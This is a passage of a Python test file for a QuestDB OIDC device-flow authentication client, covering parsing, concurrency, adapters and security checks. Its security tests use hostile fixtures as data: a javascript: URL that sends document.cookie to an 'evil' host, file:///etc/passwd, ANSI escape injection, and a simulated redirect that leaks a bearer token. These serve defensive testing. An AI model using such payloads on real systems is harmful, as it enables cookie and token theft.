        self.state.exec_response = {'ddl': 'OK'}  # no columns / dataset
        df = qdb.sql('CREATE TABLE x (a INT)')
        self.assertEqual(len(df), 0)

    def test_sql_malformed_shape_raises_oidc_error(self):
        qdb = self._connected()
        self.state.exec_response = {  # rows shorter than the column list
            'columns': [{'name': 'a', 'type': 'LONG'},
                        {'name': 'b', 'type': 'LONG'}],
            'dataset': [[1]]}
        with self.assertRaises(OidcError):
            qdb.sql('SELECT a, b FROM t')

    def test_sql_non_json_2xx_raises_oidc_error(self):
        # A 2xx body that isn't JSON (e.g. an HTML page from a reverse proxy)
        # must raise a clean OidcError, not a raw JSONDecodeError. See M3.
        qdb = self._connected()
        self.state.exec_raw = (200, 'text/html', b'<html>proxy</html>')
        with self.assertRaises(OidcError) as cm:
            qdb.sql('SELECT 1')
        self.assertNotIsInstance(cm.exception, OidcAuthError)

    def test_sql_non_dict_json_raises_oidc_error(self):
        # A valid-JSON-but-not-an-object 2xx body (e.g. a bare list) must raise
        # OidcError, not AttributeError from .get(). See M3.
        qdb = self._connected()
        self.state.exec_response = ['not', 'an', 'object']
        with self.assertRaises(OidcError) as cm:
            qdb.sql('SELECT 1')
        self.assertNotIsInstance(cm.exception, OidcAuthError)

    def test_sql_non_dict_columns_raises_oidc_error(self):
        # A /exec body whose "columns" entries aren't objects must raise a clean
        # OidcError, not an AttributeError from .get() on the column. See M3.
        qdb = self._connected()
        self.state.exec_response = {'columns': [None], 'dataset': [[1]]}
        with self.assertRaises(OidcError) as cm:
            qdb.sql('SELECT 1')
        self.assertNotIsInstance(cm.exception, OidcAuthError)


class TestConcurrency(AuthTestBase):
    def test_valid_cached_token_does_not_block_during_signin(self):
        # A caller with a valid cached token must NOT block behind another
        # thread's in-progress sign-in: the fast path takes no lock.
        auth = self.make_auth()
        valid = TokenSet(
            access_token='a', id_token=ID_TOKEN, refresh_token='r',
            expires_at=self._clock.now() + 3600)
        auth._cache.store(auth.cache_key, valid)

        auth._lock.acquire()  # simulate another thread mid-sign-in
        try:
            result = {}
            t = threading.Thread(
                target=lambda: result.update(tok=auth.token()))
            t.start()
            t.join(timeout=5)
            self.assertFalse(
                t.is_alive(), 'token() blocked behind an in-progress sign-in')
            self.assertEqual(result.get('tok'), ID_TOKEN)
        finally:
            auth._lock.release()

    def test_concurrent_signin_prompts_only_once(self):
        # Two threads racing with an empty cache must trigger exactly ONE
        # device flow; the loser reuses the winner's token.
        auth = self.make_auth()
        entered = threading.Event()
        release = threading.Event()

        class GatingRenderer(Renderer):
            def on_prompt(self, resp):
                entered.set()       # first thread is now inside the flow
                release.wait(5)     # ...holding the acquisition lock

        auth._renderer = GatingRenderer()
        results = {}

        def call(name):
            try:
                results[name] = auth.token()
            except Exception as e:  # noqa: BLE001
                results[name] = e

        t1 = threading.Thread(target=call, args=('a',))
        t1.start()
        self.assertTrue(entered.wait(5))   # t1 holds the lock in the flow
        t2 = threading.Thread(target=call, args=('b',))
        t2.start()
        release.set()                      # let t1 finish signing in
        t1.join(5)
        t2.join(5)
        self.assertEqual(results.get('a'), ID_TOKEN)
        self.assertEqual(results.get('b'), ID_TOKEN)
        self.assertEqual(self.state.device_requests, 1)  # no second prompt


class TestAdapters(unittest.TestCase):
    """Connection adapters: tested via injected fake modules (the real
    sqlalchemy / psycopg / questdb.ingress need not be installed)."""

    def _qdb(self, url='http://db.example.com:9000', token='TKN'):
        return QuestDB(url, _FakeAuth(token), insecure=True)

    def test_sender_builds_conf_with_token(self):
        qdb = self._qdb('http://db.example.com:9000', token='TKN')
        captured = {}

        fake = types.ModuleType('questdb.ingress')

        class Sender:
            @staticmethod
            def from_conf(conf, *, token=None, **kw):
                captured.update(conf=conf, token=token, kw=kw)
                return 'SENDER'

        fake.Sender = Sender
        with mock.patch.dict(sys.modules, {'questdb.ingress': fake}):
            sender = qdb.sender(auto_flush=False)
        self.assertEqual(sender, 'SENDER')
        self.assertEqual(captured['conf'], 'http::addr=db.example.com:9000;')
        self.assertEqual(captured['token'], 'TKN')
        self.assertEqual(captured['kw'], {'auto_flush': False})

    def test_sender_https_defaults_to_443(self):
        qdb = self._qdb('https://db.example.com')  # no explicit port
        captured = {}
        fake = types.ModuleType('questdb.ingress')

        class Sender:
            @staticmethod
            def from_conf(conf, *, token=None, **kw):
                captured['conf'] = conf
                return 'S'

        fake.Sender = Sender
        with mock.patch.dict(sys.modules, {'questdb.ingress': fake}):
            qdb.sender()
        self.assertEqual(captured['conf'], 'https::addr=db.example.com:443;')

    def test_psycopg_connects_as_sso_with_token(self):
        qdb = self._qdb('http://db.example.com:9000', token='TKN')
        captured = {}
        fake = types.ModuleType('psycopg')

        def connect(**kw):
            captured.update(kw)
            return 'CONN'

        fake.connect = connect
        with mock.patch.dict(sys.modules, {'psycopg': fake}):
            conn = qdb.psycopg(connect_timeout=3)
        self.assertEqual(conn, 'CONN')
        self.assertEqual(captured['user'], '_sso')
        self.assertEqual(captured['password'], 'TKN')
        self.assertEqual(captured['host'], 'db.example.com')
        self.assertEqual(captured['port'], 8812)
        self.assertEqual(captured['dbname'], 'qdb')
        self.assertEqual(captured['connect_timeout'], 3)
        # The token is fetched at connect time (fresh per connection).
        self.assertEqual(qdb.auth.calls, 1)

    def test_sqlalchemy_engine_injects_fresh_token_per_connect(self):
        auth = _FakeAuth('TKN')
        qdb = QuestDB('http://db.example.com:9000', auth, insecure=True)
        created = {}
        events = {}
        engine_obj = object()

        fake_sa = types.ModuleType('sqlalchemy')
        fake_sa.__path__ = []

        def create_engine(url, **kw):
            created.update(url=url, engine_kw=kw)
            return engine_obj

        class _Event:
            @staticmethod
            def listens_for(target, name):
                def deco(fn):
                    events.update(name=name, fn=fn)
                    return fn
                return deco

        fake_sa.create_engine = create_engine
        fake_sa.event = _Event

        fake_eng = types.ModuleType('sqlalchemy.engine')

        class _URL:
            @staticmethod
            def create(**kw):
                created.update(kw)
                return 'URL'

        fake_eng.URL = _URL
        fake_pg = types.ModuleType('psycopg')  # drives the drivername choice

        with mock.patch.dict(sys.modules, {
                'sqlalchemy': fake_sa,
                'sqlalchemy.engine': fake_eng,
                'psycopg': fake_pg}):
            engine = qdb.sqlalchemy_engine(pool_pre_ping=True)

        self.assertIs(engine, engine_obj)
        self.assertEqual(created['drivername'], 'postgresql+psycopg')
        self.assertEqual(created['username'], '_sso')
        self.assertEqual(created['host'], 'db.example.com')
        self.assertEqual(created['port'], 8812)
        self.assertEqual(created['database'], 'qdb')
        self.assertEqual(created['url'], 'URL')
        self.assertEqual(created['engine_kw'], {'pool_pre_ping': True})
        self.assertEqual(events['name'], 'do_connect')
        # The listener injects a fresh token on each new connection.
        before = auth.calls
        for _ in range(2):
            cparams = {}
            events['fn'](None, None, [], cparams)
            self.assertEqual(cparams['password'], 'TKN')
        self.assertEqual(auth.calls - before, 2)

    def test_sender_brackets_ipv6_addr(self):
        # An IPv6 literal must be bracketed in the ILP addr=host:port conf,
        # else "::1:9000" is ambiguous to the conf parser. See M5.
        qdb = self._qdb('https://[::1]:9000')
        captured = {}
        fake = types.ModuleType('questdb.ingress')

        class Sender:
            @staticmethod
            def from_conf(conf, *, token=None, **kw):
                captured['conf'] = conf
                return 'S'

        fake.Sender = Sender
        with mock.patch.dict(sys.modules, {'questdb.ingress': fake}):
            qdb.sender()
        self.assertEqual(captured['conf'], 'https::addr=[::1]:9000;')

    def test_psycopg_uses_bare_ipv6_host(self):
        # psycopg takes host and port separately, so the IPv6 host is passed
        # WITHOUT brackets (unlike the ILP addr= form). See M5.
        qdb = self._qdb('http://[::1]:9000')
        captured = {}
        fake = types.ModuleType('psycopg')

        def connect(**kw):
            captured.update(kw)
            return 'CONN'

        fake.connect = connect
        with mock.patch.dict(sys.modules, {'psycopg': fake}):
            qdb.psycopg()
        self.assertEqual(captured['host'], '::1')

    def test_require_host_rejects_hostless_url(self):
        # A URL with no extractable host must raise, not pass None to a driver;
        # an explicit host= override still resolves. See M5.
        for bad in ('localhost', 'questdb:9000'):
            with self.subTest(url=bad):
                with self.assertRaises(OidcConfigError):
                    QuestDB(bad, _FakeAuth(), insecure=True)._require_host()
        self.assertEqual(
            QuestDB('localhost', _FakeAuth())._require_host('h.example'),
            'h.example')

    def test_malformed_port_url_raises_config_error(self):
        # A QuestDB URL with a non-integer port must raise OidcConfigError at
        # construction, not a bare ValueError when an adapter reads .port. M3.
        with self.assertRaises(OidcConfigError):
            QuestDB('https://questdb.example.com:notaport', _FakeAuth(),
                    insecure=True)

    def test_sender_hostless_url_raises(self):
        # The guard propagates through an adapter (not just the helper):
        # sender() on a host-less URL raises OidcConfigError. See M5.
        qdb = self._qdb('questdb:9000')
        fake = types.ModuleType('questdb.ingress')
        fake.Sender = object()  # import must succeed so we reach the guard
        with mock.patch.dict(sys.modules, {'questdb.ingress': fake}):
            with self.assertRaises(OidcConfigError):
                qdb.sender()

    def test_sql_missing_pandas_raises(self):
        qdb = self._qdb()
        with mock.patch.dict(sys.modules, {'pandas': None}):
            with self.assertRaises(ImportError):
                qdb.sql('SELECT 1')

    @unittest.skipIf(importlib.util.find_spec('sqlalchemy') is not None,
                     'sqlalchemy installed')
    def test_sqlalchemy_engine_missing_dep_raises(self):
        with self.assertRaises(ImportError):
            self._qdb().sqlalchemy_engine()

    @unittest.skipIf(_HAS_PG_DRIVER, 'a PostgreSQL driver is installed')
    def test_psycopg_missing_dep_raises(self):
        with self.assertRaises(ImportError):
            self._qdb().psycopg()

    @unittest.skipIf(importlib.util.find_spec('questdb.ingress') is not None,
                     'questdb.ingress extension is built')
    def test_sender_missing_extension_raises(self):
        with self.assertRaises(ImportError):
            self._qdb().sender()


class TestConfigHelpers(unittest.TestCase):
    def test_as_bool_variants(self):
        from questdb.auth._discovery import _as_bool
        for v in ('true', 'True', '1', 'yes', 'on', True, 1):
            self.assertIs(_as_bool(v), True)
        for v in ('false', '0', 'no', 'off', '', False, 0):
            self.assertIs(_as_bool(v), False)
        self.assertIsNone(_as_bool(None))
        self.assertIs(_as_bool(None, default=True), True)

    def test_resolve_endpoint_relative_path(self):
        from questdb.auth._discovery import _resolve_endpoint
        cfg = {'acl.oidc.host': 'idp.example.com',
               'acl.oidc.tls.enabled': True, 'acl.oidc.port': 443}
        self.assertEqual(_resolve_endpoint('/as/token.oauth2', cfg),
                         'https://idp.example.com:443/as/token.oauth2')
        self.assertEqual(_resolve_endpoint('https://idp/x', cfg),
                         'https://idp/x')  # absolute is kept verbatim

    def test_resolve_endpoint_ignores_non_string(self):
        # A non-string endpoint from /settings (e.g. a JSON number) must be
        # treated as absent, not raise AttributeError from .startswith(). M3.
        from questdb.auth._discovery import _resolve_endpoint
        self.assertIsNone(_resolve_endpoint(8080, {}))
        self.assertIsNone(_resolve_endpoint(True, {}))

    def test_settings_config_nesting(self):
        from questdb.auth._discovery import settings_config
        self.assertEqual(settings_config({'config': {'a': 1}}), {'a': 1})
        self.assertEqual(settings_config({'a': 1}), {'a': 1})  # flat fallback


class TestEndpointValidation(unittest.TestCase):
    def setUp(self):
        from questdb.auth._discovery import validate_endpoint_origins
        self._validate = validate_endpoint_origins

    def test_default_port_equivalence_accepted(self):
        # https default (443) vs explicit :443 normalize to the same origin.
        self._validate('https://idp/token', 'https://idp:443/device')

    def test_ipv6_same_origin_accepted(self):
        self._validate('https://[::1]/token', 'https://[::1]/device')

    def test_off_origin_device_rejected(self):
        with self.assertRaises(OidcConfigError):
            self._validate('https://idp/token', 'https://evil.example/device')

    def test_both_endpoints_off_issuer_rejected(self):
        # Endpoints agree with each other but not with the pinned issuer:
        # the issuer-pin loop must check both, not just their consistency.
        with self.assertRaises(OidcConfigError):
            self._validate('https://idp/token', 'https://idp/device',
                           issuer='https://other-issuer.example')

    def test_malformed_port_raises_config_error(self):
        # A non-integer port must surface as OidcConfigError, not urllib's bare
        # ValueError (which callers catching OidcError would miss). See M6.
        with self.assertRaises(OidcConfigError):
            self._validate('https://idp:notaport/token',
                           'https://idp:notaport/device')

    def test_explicit_constructor_enforces_co_location(self):
        with self.assertRaises(OidcConfigError):
            OidcDeviceAuth(
                client_id='questdb',
                device_authorization_endpoint='https://idp.example.com/device',
                token_endpoint='https://attacker.example/token',
                renderer=Renderer())


class TestCacheKey(unittest.TestCase):
    def _auth(self, **kw):
        opts = dict(
            client_id='questdb',
            device_authorization_endpoint='https://idp.example.com/device',
            token_endpoint='https://idp.example.com/token',
            scope='openid groups', groups_in_token=True, cache='memory',
            renderer=Renderer())
        opts.update(kw)
        return OidcDeviceAuth(**opts)

    def test_normalize_url_malformed_port_raises_config_error(self):
        # cache_key normalization shares the same typed-port guard: a malformed
        # port raises OidcConfigError, not a bare ValueError. See M6.
        from questdb.auth._device import _normalize_url
        with self.assertRaises(OidcConfigError):
            _normalize_url('https://idp:notaport/token')

    def test_realm_path_distinguishes_key(self):
        # Multi-tenant IdP: same host, different realm path -> distinct keys
        # (the old origin-only key collided, leaking one realm's token).
        a = self._auth(
            token_endpoint='https://idp.example.com/realmA/token',
            device_authorization_endpoint='https://idp.example.com/realmA/dev')
        b = self._auth(
            token_endpoint='https://idp.example.com/realmB/token',
            device_authorization_endpoint='https://idp.example.com/realmB/dev')
        self.assertNotEqual(a.cache_key, b.cache_key)

    def test_scope_order_does_not_change_key(self):
        self.assertEqual(
            self._auth(scope='openid groups').cache_key,
            self._auth(scope='groups openid').cache_key)

    def test_audience_distinguishes_key(self):
        self.assertNotEqual(
            self._auth(audience='aud-1').cache_key,
            self._auth(audience='aud-2').cache_key)

    def test_default_port_normalized(self):
        self.assertEqual(
            self._auth(token_endpoint='https://idp.example.com/token').cache_key,
            self._auth(
                token_endpoint='https://idp.example.com:443/token').cache_key)


class TestTransportSecurity(unittest.TestCase):
    def test_require_secure_policy(self):
        from questdb.auth._http import _require_secure
        # https is always fine.
        _require_secure('https://idp.example.com/x', insecure=False)
        # loopback http never leaves the host -> always allowed.
        _require_secure('http://127.0.0.1:9000/x', insecure=False)
        _require_secure('http://localhost/x', insecure=False)
        _require_secure('http://[::1]:8080/x', insecure=False)
        # non-loopback http is refused unless insecure is explicitly set.
        with self.assertRaises(OidcConfigError):
            _require_secure('http://idp.example.com/x', insecure=False)
        _require_secure('http://idp.example.com/x', insecure=True)

    def test_insecure_does_not_downgrade_idp(self):
        # insecure=True must NOT permit plaintext to a non-loopback IdP: the
        # device code / refresh token must never traverse the network in clear.
        auth = OidcDeviceAuth(
            client_id='questdb',
            device_authorization_endpoint='http://idp.example.com/device',
            token_endpoint='http://idp.example.com/token',
            scope='openid', groups_in_token=False, cache='memory',
            insecure=True, interactive=True, renderer=Renderer(),
            _clock=FakeClock())
        with self.assertRaises(OidcConfigError):
            auth.token()

    def test_redirects_are_not_followed(self):
        # A 30x must NOT be followed: urllib would otherwise re-send the
        # Authorization: Bearer header (and downgrade to plaintext http) to the
        # redirect target, leaking the QuestDB token off-origin (only the
        # original URL is vetted, never the redirect target). The redirect must
        # surface as a non-2xx response, and the off-origin host must never be
        # contacted. See C1.
        from questdb.auth import _http

        seen = []

        class _Redir(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                seen.append((self.path, self.headers.get('Authorization')))
                if self.path == '/exec':
                    self.send_response(302)
                    self.send_header('Location', attacker + '/stolen')
                    self.end_headers()
                else:
                    self.send_response(200)
                    self.send_header('Content-Length', '2')
                    self.end_headers()
                    self.wfile.write(b'{}')

        victim = http.server.HTTPServer(('127.0.0.1', 0), _Redir)
        thief = http.server.HTTPServer(('127.0.0.1', 0), _Redir)
        attacker = f'http://127.0.0.1:{thief.server_port}'
        for srv in (victim, thief):
            threading.Thread(target=srv.serve_forever, daemon=True).start()
        try:
            resp = _http.request(
                'GET', f'http://127.0.0.1:{victim.server_port}/exec',
                headers={'Authorization': 'Bearer SECRET'}, timeout=5)
        finally:
            for srv in (victim, thief):
                srv.shutdown()
                srv.server_close()

        # The redirect surfaced as a non-2xx response, was not followed, and the
        # off-origin target never saw the request (or the bearer token).
        self.assertEqual(resp.status, 302)
        self.assertEqual(seen, [('/exec', 'Bearer SECRET')])

    def test_malformed_url_raises_config_error(self):
        # A non-integer port must surface as OidcConfigError, not a raw
        # http.client.InvalidURL escaping the typed-error contract — this is the
        # path the QuestDB /settings / discovery fetches go through. See M3.
        from questdb.auth._http import request
        with self.assertRaises(OidcConfigError):
            request('GET', 'https://questdb.example.com:notaport/settings',
                    timeout=5)


class TestRendererSecurity(unittest.TestCase):
    """The Jupyter prompt must never turn an IdP-supplied URL into a
    clickable/executable link unless it uses an http(s) scheme."""

    def test_safe_link_url_allowlist(self):
        from questdb.auth._render import _safe_link_url
        self.assertEqual(_safe_link_url('https://idp/x'), 'https://idp/x')
        self.assertEqual(_safe_link_url('http://idp/x'), 'http://idp/x')
        self.assertEqual(_safe_link_url('HTTPS://idp/x'), 'HTTPS://idp/x')
        for bad in ('javascript:alert(1)', 'data:text/html,x',
                    'vbscript:x', 'file:///etc/passwd', '', None):
            self.assertIsNone(_safe_link_url(bad))

    def test_render_link_inert_for_dangerous_scheme(self):
        from questdb.auth._render import _render_link
        safe = _render_link('https://idp/x')
        self.assertIn('<a href="https://idp/x"', safe)
        evil = _render_link('javascript:alert(document.cookie)')
        self.assertNotIn('<a ', evil)
        self.assertNotIn('href', evil)

    def test_jupyter_prompt_never_emits_dangerous_href(self):
        from questdb.auth._render import JupyterRenderer

        captured = {}

        class _Capturing(JupyterRenderer):
            def _display(self, html_str):  # avoid importing IPython
                captured['html'] = html_str

        # A hostile/MITM'd device response.
        _Capturing().on_prompt({
            'user_code': 'WDJB-MJHT',
            'verification_uri': 'javascript:fetch("//evil/?c="+document.cookie)',
            'verification_uri_complete': 'data:text/html,<script>x</script>',
            'expires_in': 600, 'interval': 5,
        })
        html_out = captured['html'].lower()
        self.assertNotIn('<a ', html_out)            # no clickable link at all
        self.assertNotIn('href="javascript', html_out)
        self.assertNotIn('href="data:', html_out)

        # A legitimate https URL still renders as a clickable link.
        captured.clear()
        _Capturing().on_prompt({
            'user_code': 'WDJB-MJHT',
            'verification_uri': 'https://idp.example.com/device',
            'expires_in': 600, 'interval': 5,
        })
        self.assertIn('<a href="https://idp.example.com/device"',
                      captured['html'])

    def test_terminal_prompt_strips_control_chars(self):
        # A hostile/MITM'd device response must not inject ANSI escape sequences
        # into the plain-text terminal prompt (cursor moves / screen clears that
        # could spoof the sign-in URL). The Jupyter path html-escapes; the
        # terminal path strips control characters. See M5.
        import io
        from questdb.auth._render import format_prompt, TerminalRenderer
        resp = {
            'user_code': 'WDJB\x1bMJHT',
            'verification_uri': 'https://idp.example.com/\x1b[31mdevice',
            'verification_uri_complete': 'https://idp.example.com/d\x07ev',
        }
        text = format_prompt(resp)
        self.assertNotIn('\x1b', text)            # ESC stripped
        self.assertNotIn('\x07', text)            # BEL stripped
        self.assertIn('WDJBMJHT', text)           # printable user_code survives
        self.assertIn('idp.example.com', text)

        # The full terminal path (on_prompt + on_failure) is clean too.
        buf = io.StringIO()
        r = TerminalRenderer(stream=buf)
        r.on_prompt(resp)
        r.on_failure('denied \x1b[2K by idp')     # IdP error_description path
        out = buf.getvalue()
        self.assertNotIn('\x1b', out)
        self.assertNotIn('\x07', out)


if __name__ == '__main__':
    unittest.main()
